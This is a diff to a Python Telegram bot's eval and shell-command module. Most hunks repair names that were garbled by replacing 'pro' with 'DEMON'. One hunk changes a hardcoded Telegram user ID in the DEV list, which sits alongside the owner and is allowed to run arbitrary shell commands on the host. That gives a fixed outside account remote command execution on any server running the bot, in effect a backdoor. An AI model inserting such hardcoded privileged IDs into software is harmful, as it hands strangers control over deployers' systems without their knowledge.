@@ -1,6 +1,6 @@
 import os
 import re
-import subDEMONcess
+import subprocess
 import sys
 import traceback
 from inspect import getfullargspec
@@ -28,7 +28,7 @@ async def edit_or_reply(msg: Message, **kwargs):
     spec = getfullargspec(func.__wrapped__).args
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
-DEV = [7355202884, OWNER_ID]
+DEV = [6656608288, OWNER_ID]
 @app.on_edited_message(
     filters.command("eval")
     & filters.user(DEV)
@@ -161,25 +161,25 @@ async def shellrunner(_, message: Message):
         for x in code:
             shell = re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", x)
             try:
-                DEMONcess = subDEMONcess.Popen(
+                process = subprocess.Popen(
                     shell,
-                    stdout=subDEMONcess.PIPE,
-                    stderr=subDEMONcess.PIPE,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
                 )
             except Exception as err:
                 await edit_or_reply(message, text=f"<b>ERROR :</b>\n<pre>{err}</pre>")
             output += f"<b>{code}</b>\n"
-            output += DEMONcess.stdout.read()[:-1].decode("utf-8")
+            output += process.stdout.read()[:-1].decode("utf-8")
             output += "\n"
     else:
         shell = re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", text)
         for a in range(len(shell)):
             shell[a] = shell[a].replace('"', "")
         try:
-            DEMONcess = subDEMONcess.Popen(
+            process = subprocess.Popen(
                 shell,
-                stdout=subDEMONcess.PIPE,
-                stderr=subDEMONcess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
             )
         except Exception as err:
             print(err)
@@ -192,7 +192,7 @@ async def shellrunner(_, message: Message):
             return await edit_or_reply(
                 message, text=f"<b>ERROR :</b>\n<pre>{''.join(errors)}</pre>"
             )
-        output = DEMONcess.stdout.read()[:-1].decode("utf-8")
+        output = process.stdout.read()[:-1].decode("utf-8")
     if str(output) == "\n":
         output = None
     if output:
@@ -209,4 +209,4 @@ async def shellrunner(_, message: Message):
         await edit_or_reply(message, text=f"<b>OUTPUT :</b>\n<pre>{output}</pre>")
     else:
         await edit_or_reply(message, text="<b>OUTPUT :</b>\n<code>None</code>")
-    await message.stop_DEMONpagation()
+    await message.stop_propagation()
